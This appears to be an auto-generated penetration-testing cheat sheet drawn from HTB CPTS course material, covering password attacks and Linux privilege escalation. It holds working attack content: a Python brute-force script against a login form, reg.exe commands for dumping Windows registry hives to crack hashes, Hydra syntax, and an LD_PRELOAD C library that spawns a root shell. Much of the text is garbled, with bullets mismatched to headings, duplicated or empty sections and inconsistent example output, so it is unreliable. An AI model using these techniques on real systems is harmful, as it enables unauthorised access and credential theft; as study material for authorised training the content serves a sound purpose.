```shell-session
bmdyy@htb:~$ echo -n Soccer06! | md5sum
40291c1d19ee11a7df8495c4cccefdfa  -

bmdyy@htb:~$ echo -n Soccer06! | sha256sum
a025dc6fabb09c2b8bfe23b5944635f9b68433ebd9a1a09453dd4fee00766d93  -
```

### What success looks like

- Hashing is a mathematical function which transforms an arbitrary number of input bytes into a (typically) fixed-size output; common examples of hash functions are MD5, and SHA-256.

## Memory and cache

Aliases: —  
Tags: credential, hash, password, ssh, sudo  
Category: Password / Credential Attacks / Credential Hunting in Linux  
OS: Cross-platform, Linux, Windows  
Service: SSH  
Ports: 22

### Remember this attack when

- This tool allows us to access far more resources and extract the credentials.
- For example, when we store credentials for a web page in the Firefox browser, they are encrypted and stored in logins.json on the system.
- Alternatively, LaZagne can also return results if the user has used the supported browser.

### Prerequisites

- Mimipenguin Many applications and processes work with credentials needed for authentication and store them either in memory or in files so that they can be reused.
- For example, it may be the system-required credentials for the logged-in users.
- Another example is the credentials stored in the browsers, which can also be read.

## Network Services — SSH

Aliases: SSH  
Tags: brute, host, hydra, password, port, service, shell, ssh, transfer  
Category: Password / Credential Attacks / Network Services  
OS: Linux, Windows  
Service: SSH  
Ports: 22

### Remember this attack when

- If a third party obtains the key, it cannot decrypt the messages because the key exchange method is unknown.
- If an attacker obtains the private key, which is often not password protected, he will be able to log in to the system without credentials.
- If the client can decrypt the message, it has the private key, and the SSH session can begin.

### Prerequisites

- Anyone who has access to the key could also access the transmitted data.
- Therefore, a key exchange procedure is needed for secure symmetric encryption.
- However, this is used by the server and client to determine the secret key needed to access the data.

<a id="technique-passwd-file"></a>
## Passwd file

Aliases: —  
Tags: crack, hash, password, shell  
Category: Password / Credential Attacks / Linux Authentication Process  
OS: Linux  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- Despite this, the /etc/passwd file is world-readable, giving attackers the ability to crack the passwords if hashes are stored here.
- Usually, we will find the value x in this field, indicating that the passwords are stored in a hashed form within the /etc/shadow file.
- This would allow us to remove the password field for the root user entirely.

### Prerequisites

- Although the scenarios described are rare, we should still pay attention and watch for potential security gaps, as there are applications that require specific permissions for entire folders.
- If the administrator has little experience with Linux (or the applications and their dependencies), they might mistakenly assign write permissions to the /etc directory and fail to correct them later.

### Enumeration / Detection

```shell-session
[!bash!]$ head -n 1 /etc/passwd

root::0:0:root:/root:/bin/bash
```

```shell-session

root@htb[/htb]#
```

### Remember this attack when

- Our new employee, Mark, who initially received an error when trying to set his email password to password123, now chooses Inlanefreight01!
- For this reason, there is ongoing debate among security professionals about the effectiveness of password expiration policies and when users should be required to change their passwords.

### Prerequisites

- The scope of a password policy extends beyond minimum password requirements to encompass the entire password lifecycle (such as creation, storage, management, and transmission).
- Password policy standards Due to compliance requirements and best practices, many companies follow established IT security standards.
- In the past, we may have heard phrases such as "change your password every 90 days to stay secure." The truth is that not every organization follows this—some only required password changes in the event of a confirmed compromise.

<a id="technique-rainbow-tables"></a>
## Rainbow tables

Aliases: —  
Tags: attack, hash, password  
Category: Password / Credential Attacks / Introduction to Password Cracking  
OS: Linux  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- These can be used to very quickly identify the password if its corresponding hash has already been mapped.
- For example, if the salt Th1sIsTh3S@lt is prepended to the same password, the MD5 hash would now be as follows: A salt is not a secret value — when a system goes to check an authentication request, it needs to know what salt was used so that it can check if the password hash matches.
- The reason this technique works against rainbow tables is that even if the correct password has been mapped, the combination of salt and password has likely not (especially if the salt contains non-printable characters).

### Prerequisites

- To make rainbow tables effective again, an attacker would need to update their mapping to account for every possible salt.

### Enumeration / Detection

_No distinct command block was present in this CPTS subsection; use the source-linked observations above._

### Exploitation

```shell-session
[!bash!]$ echo -n Th1sIsTh3S@lt_Soccer06! | md5sum

90a10ba83c04e7996bc53373170b5474  -
```

### What success looks like

- Rainbow tables are large pre-compiled maps of input and output values for a given hash function.

### What to do next

Validate the result → preserve any credentials/output → pivot to the next CPTS-linked enumeration or exploitation step in `Introduction to Password Cracking` → re-enumerate with the gained access.

<a id="technique-registry-hives"></a>
## Registry hives

Aliases: —  
Tags: attack, domain, host, password, smb, sudo, transfer  
Category: Password / Credential Attacks / Attacking SAM, SYSTEM, and SECURITY  
OS: Linux, Windows  
Service: SMB  
Ports: 139, 445

### Remember this attack when

- There are three registry hives we can copy if we have local administrative access to a target system, each serving a specific purpose when it comes to dumping and cracking password hashes.
- Run the following commands: If we're only interested in dumping the hashes of local users, we need only HKLM\SAM and HKLM\SYSTEM.
- If we do not include this flag, newer Windows systems may fail to connect to the share, as SMBv1 is disabled by default due to numerous severe vulnerabilities and publicly available exploits.

### Prerequisites

- There are three registry hives we can copy if we have local administrative access to a target system, each serving a specific purpose when it comes to dumping and cracking password hashes.
- This key is required to decrypt the hashes.
- | | HKLM\SECURITY | Contains sensitive information used by the Local Security Authority (LSA), including cached domain credentials (DCC2), cleartext passwords, DPAPI keys, and more.

### Enumeration / Detection

```shell-session
[!bash!]$ ls

sam.save  security.save  system.save
```

### Exploitation

```cmd-session
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

The operation completed successfully.
```


### What success looks like

- There are three registry hives we can copy if we have local administrative access to a target system, each serving a specific purpose when it comes to dumping and cracking password hashes.
- These hashes can be extracted and cracked to reveal plaintext passwords.
- Moving hive copies to share We can then confirm that our hive copies were successfully moved to the share by navigating to the shared directory on our attack host and using ls to list the files.

<a id="technique-remote-desktop-protocol-rdp"></a>
## Remote Desktop Protocol (RDP)

Aliases: —  
Tags: host, hydra, password, port, rdp, service  
Category: Password / Credential Attacks / Network Services  
OS: Linux, Windows  
Service: RDP  
Ports: 3389

### Remember this attack when

- Microsoft's Remote Desktop Protocol (RDP) is a network protocol that allows remote access to Windows systems via TCP port 3389 by default.
- In addition to the exchange of image, sound, keyboard, and pointing device, the RDP can also print documents of the terminal server on a printer connected to the terminal client or allow access to storage media available there.

### Prerequisites

- Microsoft's Remote Desktop Protocol (RDP) is a network protocol that allows remote access to Windows systems via TCP port 3389 by default.
- RDP provides both users and administrators/support staff with remote access to Windows hosts within an organization.
- In addition to the exchange of image, sound, keyboard, and pointing device, the RDP can also print documents of the terminal server on a printer connected to the terminal client or allow access to storage media available there.

<a id="technique-the-password-reuse-problem"></a>
## The Password Reuse Problem

Aliases: —  
Tags: credential, password, service  
Category: Password / Credential Attacks / Hybrid Attacks  
OS: Cross-platform / not specified  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- When users rely on the same or similar passwords for multiple accounts, a breach on one platform can have a domino effect, compromising numerous other accounts.

### Prerequisites

- The core issue fueling credential stuffing's success is the pervasive practice of password reuse.
- This highlights the urgent need for strong, unique passwords for every online service, coupled with proactive security measures like multi-factor authentication.

## The Perils of Default Credentials

Aliases: —  
Tags: attack, crack, password  
Category: Password / Credential Attacks / Password Security Fundamentals  
OS: Cross-platform / not specified  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- SecLists maintains a list of common usernames at top-usernames-shortlist.txt Default usernames are a significant vulnerability because they give attackers a predictable starting point.
- With the username already established, the attacker only needs to crack the password, and if the device still uses a default password, the attack can be completed with minimal effort.
- Even when default passwords are changed, retaining the default username still leaves systems vulnerable to attacks.

### Prerequisites

- In some cases, attackers may not even need to perform a brute-force attack; they can try a few common default passwords and gain access with minimal effort.

- Default passwords significantly increase the success rate of brute-force attacks.
- In some cases, attackers may not even need to perform a brute-force attack; they can try a few common default passwords and gain access with minimal effort.

### Prerequisites

- First, download the wordlist Next, we need to start matching that wordlist to the password policy.
- This initial grep command targets the core policy requirement of a minimum password length of 8 characters.
- Maintaining the filtering chain, this grep command ensures compliance with the policy's requirement for at least one lowercase letter.

### Enumeration / Detection

```shell-session
[!bash!]$ wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/darkweb2017_top-10000.txt
```

```shell-session
[!bash!]$ grep -E '^.{8,}$' darkweb2017_top-10000.txt > darkweb2017-minlength.txt
```

```shell-session
[!bash!]$ grep -E '[A-Z]' darkweb2017-minlength.txt > darkweb2017-uppercase.txt
```

```shell-session
[!bash!]$ grep -E '[a-z]' darkweb2017-uppercase.txt > darkweb2017-lowercase.txt
```

```shell-session
[!bash!]$ grep -E '[0-9]' darkweb2017-lowercase.txt > darkweb2017-number.txt
```

### Exploitation

```shell-session
[!bash!]$ wc -l darkweb2017-number.txt

89 darkweb2017-number.txt
```

### What success looks like

- As demonstrated by the output above, meticulously filtering the extensive 10,000-password list against the password policy has dramatically narrowed down our potential passwords to 89.
- A smaller, targeted list translates to a faster and more focused attack, optimizing the use of computational resources and increasing the likelihood of a successful breach.

<a id="technique-throwing-a-dictionary-at-the-problem"></a>
## Throwing a dictionary at the problem

Aliases: —  
Tags: attack, password, port  
Category: Password / Credential Attacks / Dictionary Attacks  
OS: Cross-platform, Linux  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- If there's a match, it responds with a JSON object containing a success message and the flag.
- If it's 200 (OK), it examines the response content further.
- If the response contains the "flag" key, it signifies a successful login.

### Prerequisites

- You only need to modify the IP and port variables to match your target system information.

### Enumeration / Detection

```shell-session
[!bash!]$ python3 dictionary-solver.py

...
Attempted password: turtle
Attempted password: tiffany
Attempted password: golf
Attempted password: bear
Attempted password: tiger
Correct password found: ...
Flag: HTB{...}
```

### Exploitation

```python
import requests

ip = "127.0.0.1"  # Change this to your instance IP address
port = 1234       # Change this to your instance port number

# Download a list of common passwords from the web and split it into lines
passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt").text.splitlines()

# Try each password from the list
for password in passwords:
    print(f"Attempted password: {password}")

    # Send a POST request to the server with the password
    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})

    # Check if the server responds with success and contains the 'flag'
    if response.ok and 'flag' in response.json():
        print(f"Correct password found: {password}")
        print(f"Flag: {response.json()['flag']}")
        break
```

### What success looks like

- If there's a match, it responds with a JSON object containing a success message and the flag.
- Otherwise, it returns an error message with a 401 status code (Unauthorized).
- If the response contains the "flag" key, it signifies a successful login.

### What to do next

Validate the result → preserve any credentials/output → pivot to the next CPTS-linked enumeration or exploitation step in `Dictionary Attacks` → re-enumerate with the gained access.

### Common problems / Why it fails

<a id="technique-understanding-the-condition-string"></a>
## Understanding the Condition String

Aliases: —  
Tags: http, hydra, password  
Category: Password / Credential Attacks / Login Forms  
OS: Cross-platform, Linux  
Service: HTTP  
Ports: 80

### Remember this attack when

- In Hydra’s http-post-form module, success and failure conditions are crucial for properly identifying valid and invalid login attempts.
- Hydra primarily relies on failure conditions (F=...) to determine when a login attempt has failed, but you can also specify a success condition (S=...) to indicate when a login is successful.
- This is the most common approach because many websites return an error message (like "Invalid username or password") when the login fails.

### Prerequisites

- Confirm the access, service configuration, and target-specific values shown in the cited CPTS source before running the commands.

### Enumeration / Detection

```bash
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"
```

```bash
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```

### Exploitation

```bash
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=Dashboard"
```

### What success looks like

- In Hydra’s http-post-form module, success and failure conditions are crucial for properly identifying valid and invalid login attempts.
- Hydra primarily relies on failure conditions (F=...) to determine when a login attempt has failed, but you can also specify a success condition (S=...) to indicate when a login is successful.
- This is the most common approach because many websites return an error message (like "Invalid username or password") when the login fails.

### What to do next

Validate the result → preserve any credentials/output → pivot to the next CPTS-linked enumeration or exploitation step in `Login Forms` → re-enumerate with the gained access.

### Common problems / Why it fails

- In Hydra’s http-post-form module, success and failure conditions are crucial for properly identifying valid and invalid login attempts.
- Hydra primarily relies on failure conditions (F=...) to determine when a login attempt has failed, but you can also specify a success condition (S=...) to indicate when a login is successful.
- The failure condition (F=...) is used to check for a specific string in the server's response that signals a failed login attempt.

<a id="technique-using-pypykatz-to-extract-credentials"></a>
## Using Pypykatz to extract credentials

Aliases: —  
Tags: attack, domain, dump, host, kerberos, password  
Category: Password / Credential Attacks / Attacking LSASS  
OS: Linux, Windows  
Service: kerberos  
Ports: 88

### Remember this attack when

- The fact that it is written in Python allows us to run it on Linux-based attack hosts.
- When we dumped LSASS process memory into the file, we essentially took a "snapshot" of what was in memory at that point in time.
- If there were any active logon sessions, the credentials used to establish them will be present.

### Prerequisites

- Once we have the dump file on our attack host, we can use a powerful tool called pypykatz to extract credentials from the .dmp file.
- At the time of writing, Mimikatz only runs on Windows systems, so to use it, we would either need to use a Windows attack host or we would need to run Mimikatz directly on the target, which is not an ideal scenario.
- This makes Pypykatz an appealing alternative because all we need is a copy of the dump file, and we can run it offline from our Linux-based attack host.

### Common problems / Why it fails

- Modern Windows operating systems have WDIGEST disabled by default.
- Additionally, it is essential to note that Microsoft released a security update for systems affected by this issue with WDIGEST.

- NetExec Usage The general format for using NetExec is as follows: As an example, this is what attacking a WinRM endpoint might look like: The appearance of (Pwn3d!) is the sign that we can most likely execute system commands if we log in with the brute-forced user.

<a id="technique-writing-custom-wordlists-and-rules"></a>
## Writing Custom Wordlists and Rules

Aliases: —  
Tags: attack, hashcat, inclusion, password, service  
Category: Password / Credential Attacks / Writing Custom Wordlists and Rules  
OS: Linux  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- Unfortunately, the tendency for users to create weak passwords occurs even when password policies are in place.
- Most individuals follow predictable patterns when creating passwords, often incorporating words closely related to the service being accessed.
- For instance, if a user selects a single word (e.g., the current month), appends the current year, and adds a special character at the end, the result may satisfy a typical ten-character password requirement.

### Prerequisites

- To mitigate this human tendency (which often undermines security measures), password policies can be implemented on systems to enforce specific password requirements.
- Most password policies mandate a minimum length—typically eight characters—and require at least one character from each specified category.
- However, it becomes significantly more challenging to apply these techniques to systems that require users to create more complex passwords.

### Enumeration / Detection

```shell-session
[!bash!]$ cat password.list

password
```

```shell-session
[!bash!]$ hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

```shell-session
[!bash!]$ cat mut_password.list

password
Password
passw0rd
Passw0rd
p@ssword
P@ssword
P@ssw0rd
password!
Password!
passw0rd!
p@ssword!
Passw0rd!
P@ssword!
p@ssw0rd!
P@ssw0rd!
```

### Exploitation

```shell-session
[!bash!]$ cat custom.rule

:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@
```

### What success looks like

- In the previous sections, we were successful at guessing simple passwords.
- Most individuals follow predictable patterns when creating passwords, often incorporating words closely related to the service being accessed.
- One of the most effective and widely used rulesets is best64.rule, which applies common transformations that frequently result in successful password guesses.

### What to do next

Validate the result → preserve any credentials/output → pivot to the next CPTS-linked enumeration or exploitation step in `Writing Custom Wordlists and Rules` → re-enumerate with the gained access.

<a id="technique-capabilities"></a>
## Capabilities

Aliases: —  
Tags: exploit, sudo  
Category: Linux Privilege Escalation / Capabilities  
OS: Linux  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- --- Linux capabilities are a security feature in the Linux operating system that allows specific privileges to be granted to processes, allowing them to perform specific actions that would otherwise be restricted.
- This allows for more fine-grained control over which processes have access to certain privileges, making it more secure than the traditional Unix model of granting privileges to users and groups.
- However, like any security feature, Linux capabilities are not invulnerable and can be exploited by attackers.

### Prerequisites

- --- Linux capabilities are a security feature in the Linux operating system that allows specific privileges to be granted to processes, allowing them to perform specific actions that would otherwise be restricted.
- This allows for more fine-grained control over which processes have access to certain privileges, making it more secure than the traditional Unix model of granting privileges to users and groups.
- One common vulnerability is using capabilities to grant privileges to processes that are not adequately sandboxed or isolated from other processes, allowing us to escalate their privileges and gain access to sensitive information or perform unauthorized actions.

### Enumeration / Detection

_No distinct command block was present in this CPTS subsection; use the source-linked observations above._

### Exploitation


### What success looks like

- This allows for more fine-grained control over which processes have access to certain privileges, making it more secure than the traditional Unix model of granting privileges to users and groups.
- One common vulnerability is using capabilities to grant privileges to processes that are not adequately sandboxed or isolated from other processes, allowing us to escalate their privileges and gain access to sensitive information or perform unauthorized actions.
- This can create unnecessary security risks, as we could exploit these privileges to gain access to sensitive information or perform unauthorized actions.

Aliases: Exploitation

### Remember this attack when

- If we gained access to the system with a low-privilege account, then discovered the capdacoverride capability: Exploiting Capabilities For example, the /usr/bin/vim.basic binary is run without special privileges, such as with sudo.
- This would allow the penetration tester to gain the capdacoverride capability and perform tasks that require this capability.

### Prerequisites

- If we gained access to the system with a low-privilege account, then discovered the capdacoverride capability: Exploiting Capabilities For example, the /usr/bin/vim.basic binary is run without special privileges, such as with sudo.
- However, because the binary has the capdacoverride capability set, it can escalate the privileges of the user who runs it.
- This would allow the penetration tester to gain the capdacoverride capability and perform tasks that require this capability.

<a id="technique-cron-job-abuse"></a>
## Cron Job Abuse

Aliases: —  
Tags: abuse, attack, netcat, scan, shell, sudo  
Category: Linux Privilege Escalation / Cron Job Abuse  
OS: Cross-platform, Linux  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- When created, the cron file will be created in /var/spool/cron for the specific user that creates it.
- You may find a world-writable script that runs as root and, even if you cannot read the crontab to know the exact schedule, you may be able to ascertain how often it runs (i.e., a backup script that creates a .tar.gz file every 12 hours).
- Certain applications create cron files in the /etc/cron.d directory and may be misconfigured to allow a non-root user to edit them.

### Prerequisites

- Each entry in the crontab file requires six items in the following order: minutes, hours, days, months, weeks, commands.
- The root crontab is almost always only editable by the root user or a user with full sudo privileges; however, it can still be abused.
- We can confirm that a cron job is running using pspy, a command-line tool used to view running processes without the need for root privileges.

- In this case, you can append a command onto the end of the script (such as a reverse shell one-liner), and it will execute the next time the cron job runs.
- The second issue is that the backup.sh shell script is world writeable and runs as root.
- From the above output, we can see that a cron job runs the backup.sh script located in the /dmz-backups directory and creating a tarball file of the contents of the /var/www/html directory.

<a id="technique-dirty-pipe"></a>
## Dirty Pipe

Aliases: —  
Tags: exploit, password, shell, ssh, sudo, suid  
Category: Linux Privilege Escalation / Dirty Pipe  
OS: Linux  
Service: SSH  
Ports: 22

### Remember this attack when

- --- A vulnerability in the Linux kernel, named Dirty Pipe (CVE-2022-0847), allows unauthorized writing to root user files on Linux.
- Technically, the vulnerability is similar to the Dirty Cow vulnerability discovered in 2016.
- All kernels from version 5.8 to 5.17 are affected and vulnerable to this vulnerability.

### Prerequisites

- In simple terms, this vulnerability allows a user to write to arbitrary files as long as he has read access to these files.
- To exploit this vulnerability, we need to download a PoC and compile it on the target system itself or a copy we have made.
- The first exploit version (exploit-1) modifies the /etc/passwd and gives us a prompt with root privileges.

### Enumeration / Detection

```shell-session
cry0l1t3@nix02:~$ uname -r

5.13.0-46-generic
```

```shell-session
Setting root password to "piped"...
Password: Restoring /etc/passwd from /tmp/passwd.bak...
Done! Popping shell... (run commands now)

id

uid=0(root) gid=0(root) groups=0(root)
```

<a id="technique-docker-privilege-escalation"></a>
## Docker Privilege Escalation

Aliases: —  
Tags: host, ssh, suid, upload, wget  
Category: Linux Privilege Escalation / Docker  
OS: Cross-platform, Linux  
Service: SSH  
Ports: 22

### Remember this attack when

- What can happen is that we get access to an environment where we will find users who can manage docker containers.
- Docker Shared Directories When using Docker, shared directories (volume mounts) can bridge the gap between the host system and the container's filesystem.
- When mounted as read-only, modifications made within the container won't affect the host system, which is useful when read-only access is preferred to prevent accidental modifications.

### Prerequisites

- What can happen is that we get access to an environment where we will find users who can manage docker containers.
- With this, we could look for ways how to use those docker containers to obtain higher privileges on the target system.
- We can use several ways and techniques to escalate our privileges or escape the docker container.

### Enumeration / Detection

- What can happen is that we get access to an environment where we will find users who can manage docker containers.
- With shared directories, specific directories or files on the host system can be made accessible within the container.
- When mounted as read-only, modifications made within the container won't affect the host system, which is useful when read-only access is preferred to prevent accidental modifications.

### What to do next

Validate the result → preserve any credentials/output → pivot to the next CPTS-linked enumeration or exploitation step in `Docker` → re-enumerate with the gained access.

### Common problems / Why it fails

- We can use several ways and techniques to escalate our privileges or escape the docker container.
- When we issue a command through the Docker CLI, the Docker client sends the command to the Docker socket, and the Docker daemon, in turn, processes the command and carries out the requested actions.
- Access to the Docker socket is typically restricted to specific users or user groups, ensuring that only trusted individuals can issue commands and interact with the Docker daemon.

- No separately named variant was identified in the cited CPTS subsection.

## Escaping

Aliases: —  
Tags: inject, shell  
Category: Linux Privilege Escalation / Escaping Restricted Shells  
OS: Linux  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- For example, suppose the shell allows users to execute commands by passing them as arguments to a built-in command.
- Command injection Imagine that we are in a restricted shell that allows us to execute commands by passing them as arguments to the ls command.
- Unfortunately, the shell only allows us to execute the ls command with a specific set of arguments, such as ls -l or ls -a, but it does not allow us to execute any other commands.

### Prerequisites

- We would need to use multiple commands in a single command line, separated by a shell metacharacter, such as a semicolon (;) or a vertical bar (|), to execute a command.

### Enumeration / Detection

_No distinct command block was present in this CPTS subsection; use the source-linked observations above._

### Exploitation

```shell-session
[!bash!]$ ls -l `pwd` 
```

### What success looks like

- In some cases, it may be possible to escape from a restricted shell by injecting commands into the command line or other inputs the shell accepts.
- For example, suppose the shell allows users to execute commands by passing them as arguments to a built-in command.
- In that case, it may be possible to escape from the shell by injecting additional commands into the argument.

### What to do next

Validate the result → preserve any credentials/output → pivot to the next CPTS-linked enumeration or exploitation step in `Escaping Restricted Shells` → re-enumerate with the gained access.

- In some cases, it may be possible to escape from a restricted shell by injecting commands into the command line or other inputs the shell accepts.

- In this situation, we can use command injection to escape from the shell by injecting additional commands into the argument of the ls command.

## Escaping Restricted Shells

Aliases: —  
Tags: bypass, shell  
Category: Linux Privilege Escalation / Escaping Restricted Shells  
OS: Cross-platform, Linux, Windows  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- In a restricted shell, the user is only allowed to execute a specific set of commands or only allowed to execute commands in specific directories.
- Additionally, restricted shells can give users access to only certain system features, allowing administrators to control which resources and functions are available to each user.
- Some of these methods involve exploiting vulnerabilities in the shell itself, while others involve using creative techniques to bypass the restrictions imposed by the shell.

### Prerequisites

- Additionally, restricted shells can give users access to only certain system features, allowing administrators to control which resources and functions are available to each user.
- For example, external partners who need to access only certain network features, such as email and file sharing, are assigned to rbash shells, which limits their ability to execute specific commands and access certain directories.
- Contractors who need to access more advanced network features, such as database servers and web servers, are assigned to rksh shells, which provide them with more flexibility but still limit their abilities.

### Remember this attack when

- Let's say we have just gained access to a Linux host by exploiting an unrestricted file upload vulnerability during an External Penetration Test.
- If we landed on a CentOS host or Red Hat Enterprise Linux host, our enumeration would likely be slightly different than if we landed on a Debian-based host such as Ubuntu.
- If we land on a host such as FreeBSD, Solaris, or something more obscure such as the HP proprietary OS HP-UX or the IBM OS AIX, the commands we would work with will likely be different.

### Prerequisites

- Let's say we have just gained access to a Linux host by exploiting an unrestricted file upload vulnerability during an External Penetration Test.
- Though the commands may be different, and we may even need to look up a command reference in some instances, the principles are the same.
- That being said, make sure you understand what the commands are doing and how to tweak them or find the information you need a different way if a particular command doesn't work.

<a id="technique-hijacking-tmux-sessions"></a>
## Hijacking Tmux Sessions

Aliases: —  
Tags: nmap, scan  
Category: Linux Privilege Escalation / Miscellaneous Techniques  
OS: Cross-platform / not specified  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- Terminal multiplexers such as tmux can be used to allow multiple terminal sessions to be accessed within a single console session.
- When not working in a tmux window, we can detach from the session, still leaving it active (i.e., running an nmap scan).
- If we can compromise a user in the devs group, we can attach to this session and gain root access.

### Prerequisites

- For many reasons, a user may leave a tmux process running as a privileged user, such as root set up with weak permissions, and can be hijacked.
- Finally, attach to the tmux session and confirm root privileges.

### Enumeration / Detection

```shell-session
htb@NIX02:~$ tmux -S /shareds new -s debugsess
htb@NIX02:~$ chown root:devs /shareds
```

```shell-session
htb@NIX02:~$  ps aux | grep tmux

root      4806  0.0  0.1  29416  3204 ?        Ss   06:27   0:00 tmux -S /shareds new -s debugsess
```

```shell-session
htb@NIX02:~$ ls -la /shareds 

srw-rw---- 1 root devs 0 Sep  1 06:27 /shareds
```

```shell-session
htb@NIX02:~$ id

uid=1000(htb) gid=1000(htb) groups=1000(htb),1011(devs)
```

### Exploitation


### What success looks like

- Terminal multiplexers such as tmux can be used to allow multiple terminal sessions to be accessed within a single console session.
- If we can compromise a user in the devs group, we can attach to this session and gain root access.

## Insecure Write Permissions

Aliases: —  
Tags: hijack, host, password, payload, shell, sudo, suid  
Category: Linux Privilege Escalation / Python Library Hijacking  
OS: Linux  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- This allows the python module to be edited and manipulated so that we can insert commands or functions that will produce the results we want.
- If our user is allowed to run the Python script as root via sudo, our injected code will automatically be executed with those elevated privileges.
- We do not have write permission - if we did, we could simply write our payload directly to memstatus.py.

### Prerequisites

- This is the actual python script that imports a python module and the privileges of the script as well as the permissions of the module.
- One or another python module may have write permissions set for all users by mistake.
- If our user is allowed to run the Python script as root via sudo, our injected code will automatically be executed with those elevated privileges.

<a id="technique-internals"></a>
## Internals

Aliases: —  
Tags: host, jenkins, port, ssh  
Category: Linux Privilege Escalation / Linux Services & Internals Enumeration  
OS: Cross-platform, Linux, Windows  
Service: SSH, jenkins  
Ports: 22, 8080

### Remember this attack when

- When we talk about the internals, we mean the internal configuration and way of working, including integrated processes designed to accomplish specific tasks.
- Hosts It can also be helpful to check out each user's last login time to try to see when users typically log in to the system and how frequently.
- This can give us an idea of how widely used this system is which can open up the potential for more misconfigurations or "messy" directories or command histories.

### Prerequisites

- Reviewing what the user has been doing can give you considerable insight into the type of server you land on and give a hint as to privilege escalation paths.
- In conjunction with other misconfigurations such as relative paths or weak permissions, they can leverage to escalate privileges when the scheduled cron job runs.

### Remember this attack when

- When you gain initial shell access to the host, it is important to check several key details.
- This would also identify the operating system version, for which there may be public exploits available.
- Kernel Version: As with the OS version, there may be public exploits that target a vulnerability in a specific kernel version.

### Prerequisites

- Enumeration is the key to privilege escalation.

## Kubernetes API

Aliases: —  
Tags: curl, exploit, host, http, scan  
Category: Linux Privilege Escalation / Kubernetes  
OS: Cross-platform  
Service: HTTP  
Ports: 80

### Remember this attack when

- The Kubernetes API has been designed to support declarative control, allowing users to define their desired state for the system.
- By default, the Kubelet allows anonymous access.
- In this case, we try to access the root path, which would grant significant control over the Kubernetes cluster if successful.

### Prerequisites

- This technique involves assigning specific roles to users or processes with corresponding permissions to access and operate on resources.
- K8's API Server Interaction System:anonymous typically represents an unauthenticated user, meaning we haven't provided valid credentials or are trying to access the API server anonymously.
- By default, access to the root path is generally restricted to authenticated and authorized users with administrative privileges and the API server denied the request, responding with a 403 Forbidden status code accordingly.

- Once the user has been authenticated, Kubernetes enforces authorization decisions using Role-Based Access Control (RBAC).
- This technique involves assigning specific roles to users or processes with corresponding permissions to access and operate on resources.
- Therefore, Kubernetes' authentication and authorization process is a comprehensive security measure that ensures only authorized users can access resources and perform operations.

- This can be problematic as any process or user that can reach the Kubelet API can make requests and receive responses, potentially exposing sensitive information or leading to unauthorized actions.

<a id="technique-ldpreload-privilege-escalation"></a>
## LDPRELOAD Privilege Escalation

Aliases: —  
Tags: exploit, service, sudo  
Category: Linux Privilege Escalation / Shared Libraries  
OS: Linux  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- The target behavior or access described in the cited `Shared Libraries` section is present.

### Prerequisites

- Let's see an example of how we can utilize the LDPRELOAD environment variable to escalate privileges.
- For this, we need a user with sudo privileges.
- This user has rights to restart the Apache service as root, but since this is NOT a GTFOBin and the /etc/sudoers entry is written specifying the absolute path, this could not be used to escalate privileges under normal circumstances.

### Enumeration / Detection

_No distinct command block was present in this CPTS subsection; use the source-linked observations above._

### Exploitation

```shell-session
htb_student@NIX02:~$ sudo -l

Matching Defaults entries for daniel.carter on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User daniel.carter may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/apache2 restart
```

```C
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

```shell-session
htb_student@NIX02:~$ gcc -fPIC -shared -o root.so root.c -nostartfiles
```

```shell-session
htb_student@NIX02:~$ sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart

id
uid=0(root) gid=0(root) groups=0(root)
```

### What success looks like

- The command returns the expected target data, authenticated access, execution, or shell shown in the cited CPTS example.

<a id="technique-linux-containers"></a>
## Linux Containers

Aliases: —  
Tags: exploit, host, service, transfer, upload  
Category: Linux Privilege Escalation / LXD  
OS: Cross-platform, Linux  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- Linux Containers (LXC) is an operating system-level virtualization technique that allows multiple Linux systems to run in isolation from each other on a single host by owning their own processes but sharing the host system kernel for them.
- We can find this out with the following command: From here on, there are now several ways in which we can exploit LXC/LXD.
- Such templates often do not have passwords, especially if they are uncomplicated test environments.

### Prerequisites

- Before we can use this service to escalate our privileges, we must be in either the lxc or lxd group.
- For this, we need to import this container as an image.
- After verifying that this image has been successfully imported, we can initiate the image and configure it by specifying the security.privileged flag and the root path for the container.

### Enumeration / Detection

<a id="technique-logrotate"></a>
## Logrotate

Aliases: —  
Tags: attack, exploit, mysql, payload, port, shell, sudo, transfer  
Category: Linux Privilege Escalation / Logrotate  
